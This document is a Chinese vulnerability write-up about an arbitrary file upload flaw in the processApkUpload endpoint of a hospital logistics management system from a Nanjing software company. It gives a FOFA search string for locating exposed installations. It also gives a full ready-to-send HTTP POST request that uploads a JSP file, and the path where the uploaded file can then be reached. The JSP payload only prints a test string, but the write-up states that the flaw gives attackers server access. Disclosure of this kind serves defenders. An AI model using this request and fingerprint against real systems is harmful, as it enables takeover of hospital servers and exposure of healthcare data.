# 南京博纳睿通软件科技有限公司医院一站式后勤管理系统processApkUpload存在任意文件上传漏洞

# 一、漏洞简介
医院后勤综合管理平台(Hospital Logistics Management Platform，以下简称HLMP)基于现代医院后勤管理理念，结合后勤业务管理特点，通过管理平台将后勤管理业务予以系统化、规范化和流程化，从而形成一套构建于平台之上且成熟完善的后勤管理体系，并可在此体系上充分挖掘管理潜力，以提高工作效率、加强有效沟通、降低管理成本、辅助管理决策。 南京博纳睿通软件科技有限公司医院后勤保障管理系统processApkUpload存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 南京博纳睿通软件科技有限公司医院后勤保障管理系统

# 三、资产测绘
+ fofa`body="frameworkModuleJob" `
+ 特征

![1711205380423-60b78e14-9101-4ae8-8a9d-bd2b7c184593.png](./img/Z1w4oHFdZ1FH_2QG/1711205380423-60b78e14-9101-4ae8-8a9d-bd2b7c184593-320960.png)

# 四、漏洞复现
```plain
POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 197

--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="stc.jsp"
Content-Type: application/octet-stream

<% out.println("123");%>
--00content0boundary00--
```

![1711211118920-85b8938f-02a2-4ef6-b68d-35c00b5edf78.png](./img/Z1w4oHFdZ1FH_2QG/1711211118920-85b8938f-02a2-4ef6-b68d-35c00b5edf78-868233.png)

根据响应获取上传文件位置

```plain
/apk/33/stc.jsp
```

![1711211148919-d8550b80-ea67-4bff-908d-2d214c4adc9a.png](./img/Z1w4oHFdZ1FH_2QG/1711211148919-d8550b80-ea67-4bff-908d-2d214c4adc9a-945275.png)



> 更新: 2024-04-20 22:05:29  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/az2vflngvgmzr9ew>